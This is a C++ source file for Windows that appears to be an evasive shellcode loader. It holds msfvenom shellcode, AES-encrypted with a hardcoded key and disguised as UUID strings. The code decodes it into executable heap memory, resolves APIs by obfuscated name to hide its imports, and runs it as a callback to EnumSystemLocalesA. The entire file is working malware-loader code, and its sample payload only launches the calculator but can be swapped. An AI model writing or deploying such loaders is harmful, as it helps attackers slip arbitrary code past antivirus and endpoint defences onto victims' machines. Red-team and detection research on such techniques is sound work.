#include <windows.h>
#include <iostream>
#include <stdlib.h>
#include <Rpc.h>
#pragma comment(lib, "Rpcrt4.lib")
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include "helpers.h"

// Pop calc shellcode created with msfvenom, AES encrypted and converted to Uuids
const char* uuids[] = { "d299b868-3f13-64ac-bb2b-34ef667e5779",
                        "13a31af6-2091-9069-bf6f-bcb5cfec2829",
                        "9d32df3b-96a0-c81c-b47f-5235f58e6199",
                        "4974ae8a-134a-590e-078f-082b44d263f3",
                        "bba37eab-f651-a885-6e98-365905e52510",
                        "fc6a4c30-bb66-6b7c-aac0-28458c224660",
                        "17c2ab45-2511-c0f4-d957-b7708e281f1e",
                        "71199a5d-6105-85ce-36de-b27e2cc99e3e",
                        "ebbb72a4-ba70-edbe-074d-db162b745917",
                        "324703cf-d1dd-343e-8aaf-404541b3e04b",
                        "501d9d94-108c-6784-34ff-ee1770f53a12",
                        "85861063-9565-845a-fdd8-fe662cd8f86f",
                        "680f6b66-ecc8-622e-84c5-9c5fb47e9d37",
                        "b47756c1-b179-cda0-070c-e7b7e7461ca3",
                        "9d72adce-9345-aa6e-e243-5d706e272926",
                        "b951bede-926e-1ba6-9724-c1968016af06",
                        "e8a9d397-21f6-1dcb-a3d7-ccc536830505",
                        "03a356af-d0fc-2b11-8fa8-2ec262f1bdc4" };

// Key to decrypt the payload
unsigned char key[] = { 0x2a, 0x93, 0xac, 0x5, 0x2e, 0xee, 0x1b, 0x4, 0x37, 0x4e, 0xbe, 0xd, 0x98, 0xa8, 0xbc, 0x79 };
    
typedef HANDLE (WINAPI * tHeapCreate)(
    DWORD flOptions,
    SIZE_T dwInitialSize,
    SIZE_T dwMaximumSize);

typedef HANDLE (WINAPI * tHeapAlloc)(
  HANDLE hHeap,
  DWORD  dwFlags,
  SIZE_T dwBytes
);

typedef BOOL (WINAPI * tEnumSystemLocalesA)(
    LOCALE_ENUMPROCA lpLocaleEnumProc,
    DWORD dwFlags);

typedef BOOL (WINAPI * tVirtualProtect)(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
);

typedef LPVOID (WINAPI * tVirtualAlloc)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);

// AES decryption function
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}

int main() {
//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    DWORD oldprotect = 0;

    //Using char array to avoid full strings in executable
    std::wstring sKernel32 = { 'k','e','r','n','e','l','3','2','.','d','l','l'};
    unsigned char sHeapCreate[] = {'H','e','a','p','C','r','e','a','t','e',0x0};
    unsigned char sHeapAlloc[] = {'H','e','a','p','A','l','l','o','c',0x0};
    unsigned char sEnumSystemLocales[] = {'E','n','u','m','S','y','s','t','e','m','L','o','c','a','l','e','s','A',0x0};
    unsigned char sVirtualProtect[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0x0};
    unsigned char sVirtualAlloc[] = {'V','i','r','t','u','a','l','A','l','l','o','c',0x0};

    int elems = sizeof(uuids) / sizeof(uuids[0]);
    int payload_size = elems*16;

    // Allocating space in the heap, according to Microsoft's documentation the largest memory block that can be allocated from the heap is slightly less than 512 KB for a 32-bit process and slightly less than 1,024 KB for a 64-bit process. If you need more space use VirtaulAlloc or your prefered method.
    tHeapCreate pHeapCreate = (tHeapCreate)hlpGetProcAddress(hlpGetModuleHandle(&sKernel32[0]), (char *)sHeapCreate);
    tHeapAlloc pHeapAlloc = (tHeapAlloc)hlpGetProcAddress(hlpGetModuleHandle(&sKernel32[0]), (char *)sHeapAlloc);
    HANDLE hc = pHeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    HANDLE ha = pHeapAlloc(hc, HEAP_ZERO_MEMORY, payload_size);

    //tVirtualAlloc pVirtualAlloc = (tVirtualAlloc)hlpGetProcAddress(hlpGetModuleHandle(&sKernel32[0]), (char *) sVirtualAlloc);
    //HANDLE ha = pVirtualAlloc(0, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


    // Converting Uuids to bytes
    DWORD_PTR hptr = (DWORD_PTR)ha;

    for (int i = 0; i < elems; i++) {
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID *)hptr);
        if (status != RPC_S_OK) {
            printf("UuidFromStringA() != S_OK\n");
            CloseHandle(ha);
            CloseHandle(hc);
            return -1;
        }
        hptr += 16;
    }

    // Decrypt payload in heap memory
    AESDecrypt((char *) ha, payload_size, (char *) key, sizeof(key));

    // Change permissions
    tVirtualProtect pVirtualProtect = (tVirtualProtect)hlpGetProcAddress(hlpGetModuleHandle(&sKernel32[0]), (char *)sVirtualProtect);
    pVirtualProtect(ha, payload_size, PAGE_EXECUTE_READ, &oldprotect);

    
    // Execute the shellcode passing it as a callback function to EnumSystemLocalesA
    tEnumSystemLocalesA pEnumSystemLocalesA = (tEnumSystemLocalesA)hlpGetProcAddress(hlpGetModuleHandle(&sKernel32[0]), (char *)sEnumSystemLocales);
    pEnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
    CloseHandle(hc);
    CloseHandle(ha);

    return 0;
}
